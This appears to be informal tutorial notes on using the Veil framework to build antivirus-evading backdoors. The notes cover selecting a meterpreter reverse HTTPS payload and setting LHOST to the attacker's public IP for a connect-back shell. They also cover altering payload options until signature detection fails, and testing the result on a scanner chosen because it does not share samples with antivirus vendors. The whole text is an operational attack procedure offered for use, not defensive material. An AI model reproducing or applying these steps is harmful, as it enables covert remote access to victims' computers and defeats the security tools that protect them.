Veil installation:
https://github.com/Veil-Framework/Veil


run veil by this command 
veil

veil has 2 main tools, if you do "list" you will be a able to see available tools.
Evasion - generate undetectable backdoors for us, the one which we are interested
Ordance - generate the payload thats used by evasion, part of the code that does the "evil part".

to use anything type "use" + number

now when you used your tool check the available payload by
list

lets take an example
go/meterpreter/rev_https.py
this is the way it works
program_language/type_of_payload/method_of_connection

after you select a payload 
do "options" to see all available 
set lhost - your own public/private ip
*if the backdoor destanation is outside of the network then use public ip

set lport - your desigred port

antivirus has a list which they are working with and if the file in the list,
they will consider it as a virus. the way to bypass it is changing the code as much as possible to make it unique.
so lets start changing the code!

first lets change the processors set the value to 1,
set processors 1
now lets change the sleep options to make it more unique,
set clicktrack 278
set as much options to make it unique, if the file doesnt work change some options until it does
(those are just an example)

Great job!
now to generate and name the backdoor type
generate

to check if it can be detected scan it at 
https://antiscan.me

make sure that the antivirus checker isnt sending the information to the antivirus companies.
